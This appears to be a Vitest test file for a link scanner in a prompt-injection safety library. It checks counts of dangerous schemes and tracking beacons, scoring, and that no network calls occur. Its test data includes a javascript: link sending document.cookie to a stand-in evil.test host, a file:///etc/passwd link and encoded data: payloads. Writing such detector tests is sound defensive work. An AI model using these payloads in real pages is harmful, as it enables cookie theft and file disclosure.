import { once } from "node:events";
import { readdirSync, readFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { FieldKind } from "@/lib/safety/limits";
import { scoreInjection } from "@/lib/safety/injection";
import { linkScore, scanLinks } from "@/lib/safety/links";
import { normalizeText } from "@/lib/safety/normalize";
import { loadClean, loadInjections } from "../helpers/corpus";

const none = { total: 0, dangerous: {}, beacons: 0 };

describe("scanLinks: counting links", () => {
  it("counts web links only, and returns nothing but counts", () => {
    const result = scanLinks("see https://example.com/a and http://example.org/b, or [docs](https://example.net/c)");
    expect(result).toEqual({ total: 3, dangerous: {}, beacons: 0 });
    expect(Object.keys(result).sort()).toEqual(["beacons", "dangerous", "total"]);
  });

  it.each([
    "plain text with no links",
    "an address person@example.com and a file named file.txt",
    "www.example.com is not a scheme",
    "",
    "   \n\t ",
  ])("finds nothing in %j", (text) => {
    expect(scanLinks(text)).toEqual(none);
  });
});

describe("scanLinks: dangerous schemes", () => {
  it.each([
    ["javascript:alert(1)", { javascript: 1 }],
    ["JavaScript:alert(1)", { javascript: 1 }],
    ["[x](javascript:fetch('https://evil.test/?c='+document.cookie))", { javascript: 1 }],
    ["vbscript:msgbox(1)", { vbscript: 1 }],
    ["data:text/html;base64,PHNjcmlwdD4=", { data_html: 1 }],
    ["data:application/javascript;base64,YWxlcnQoMSk=", { data_application: 1 }],
    ["file:///etc/passwd", { file: 1 }],
    ["ftp://evil.test/payload.bin", { ftp: 1 }],
    ["file:///a and ftp://b.test/c", { file: 1, ftp: 1 }],
    ["javascript:a() javascript:b() javascript:c()", { javascript: 3 }],
  ])("counts %j", (text, expected) => {
    expect(scanLinks(text).dangerous).toEqual(expected);
  });

  it.each([
    "notjavascript:x",
    "file: config.yaml",
    "the file:name pattern",
    "ftp is old",
    "data:image/png;base64,iVBORw0KGgo=",
    "data: 12 rows",
    "use the javascript language",
  ])("does not count %j", (text) => {
    expect(scanLinks(text).dangerous).toEqual({});
  });
});

describe("scanLinks: beacons", () => {
  it.each([
    ["![status](https://tracker.example/pixel.gif?agent=1)", 1],
    ["![a](http://t.example/p.gif) ![b](https://t.example/q.gif)", 2],
    ['<img src="x.png">', 1],
    ["<IMG SRC=https://t.example/q.gif>", 1],
    ['<iframe src="https://t.example/"></iframe>', 1],
    ["<script>run()</script>", 1],
    ['<link rel="stylesheet" href="x.css">', 1],
    ["<object data=x></object>", 1],
    ["![a](https://t.example/p.gif) <img src=https://t.example/q.gif>", 2],
  ])("counts %j as %i", (text, expected) => {
    expect(scanLinks(text).beacons).toBe(expected);
  });

  it.each([
    "![a](./local.png)",
    "![alt text]",
    "</script> and </iframe>",
    "<imgur> and <links> and <objects>",
    "a < img and 3 < 5",
    "[link](https://example.com)",
  ])("does not count %j", (text) => {
    expect(scanLinks(text).beacons).toBe(0);
  });
});

describe("linkScore", () => {
  const scan = (dangerous: Record<string, number>, beacons = 0, total = 0) => ({ total, dangerous, beacons });

  it("is 3 per dangerous link, capped at 9, and 2 per beacon, capped at 6", () => {
    expect(linkScore(none)).toBe(0);
    expect(linkScore(scan({ javascript: 1 }))).toBe(3);
    expect(linkScore(scan({ file: 1, ftp: 1 }))).toBe(6);
    expect(linkScore(scan({ javascript: 3 }))).toBe(9);
    expect(linkScore(scan({ javascript: 4, file: 4 }))).toBe(9);
    expect(linkScore(scan({}, 1))).toBe(2);
    expect(linkScore(scan({}, 3))).toBe(6);
    expect(linkScore(scan({}, 9))).toBe(6);
    expect(linkScore(scan({ javascript: 1 }, 1))).toBe(5);
    expect(linkScore(scan({ javascript: 9 }, 9))).toBe(15);
  });

  it("ignores ordinary links", () => {
    expect(linkScore(scanLinks("https://example.com/a https://example.org/b http://example.net/c"))).toBe(0);
  });
});

describe("links against the development corpora", () => {
  const kindOf = (field: string) => field as FieldKind;

  it("pushes every dev scheme-and-beacon injection to its expected line, together with the injection score", () => {
    const entries = loadInjections().filter((e) => e.set === "dev" && e.family === "scheme_and_beacon");
    expect(entries.length).toBeGreaterThanOrEqual(3);
    for (const entry of entries) {
      const normalized = normalizeText(entry.text);
      const total =
        scoreInjection(normalized.text, { kind: kindOf(entry.field), stripped: normalized.stripped }).score +
        linkScore(scanLinks(normalized.text));
      expect(total, `${entry.id} scored ${total}`).toBeGreaterThanOrEqual(entry.expect === "block" ? 9 : 3);
    }
  });

  it("gives every dev clean trace a link score below the flag line", () => {
    for (const entry of loadClean().filter((e) => e.set === "dev")) {
      const score = linkScore(scanLinks(normalizeText(entry.text).text));
      expect(score, `${entry.id} scored ${score}`).toBeLessThan(3);
    }
  });
});

describe("links are never fetched", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("makes no network request for a link it scans", async () => {
    const requests: string[] = [];
    const server = createServer((request, response) => {
      requests.push(request.url ?? "");
      response.end("ok");
    });
    server.listen(0, "127.0.0.1");
    await once(server, "listening");
    const { port } = server.address() as AddressInfo;
    const fetchSpy = vi.spyOn(globalThis, "fetch");

    const url = `http://127.0.0.1:${port}/pixel.gif`;
    const result = scanLinks(`see ${url}, ![x](${url}) and <img src=${url}>`);
    linkScore(result);
    await new Promise((resolve) => setTimeout(resolve, 150));
    server.close();

    expect(result.total).toBe(3);
    expect(result.beacons).toBe(2);
    expect(requests).toEqual([]);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("keeps all of lib/safety free of network code", () => {
    const dir = path.join(path.dirname(fileURLToPath(import.meta.url)), "../../lib/safety");
    const files = readdirSync(dir).filter((name) => name.endsWith(".ts"));
    expect(files.length).toBeGreaterThanOrEqual(8);
    for (const name of files) {
      const source = readFileSync(path.join(dir, name), "utf8");
      for (const forbidden of ["fetch(", "node:http", "node:https", "node:net", "node:dns", "XMLHttpRequest", 'import("http', "WebSocket", "sendBeacon"]) {
        expect(source.includes(forbidden), `${name} contains ${forbidden}`).toBe(false);
      }
    }
  });
});

describe("scanLinks: speed on hostile input", () => {
  const BIG = 32_000;
  const inputs: Array<[string, string]> = [
    ["a", "a".repeat(BIG)],
    ["http://", "http://".repeat(BIG / 7)],
    ["![", "![".repeat(BIG / 2)],
    ["![a](http://", "![a](http://".repeat(BIG / 12)],
    ["javascript:", "javascript:".repeat(BIG / 11)],
    ["<img ", "<img ".repeat(BIG / 5)],
    ["data:text/html", "data:text/html".repeat(BIG / 14)],
    ["(", "(".repeat(BIG)],
    ["<", "<".repeat(BIG)],
    ["![ and a long alt", "![" + "a".repeat(BIG)],
    ["file://", "file://".repeat(BIG / 7)],
  ];

  it.each(inputs)("scans 32,000 characters of %j within 500 ms", (_label, text) => {
    const start = Date.now();
    scanLinks(text);
    expect(Date.now() - start).toBeLessThan(500);
  });
});
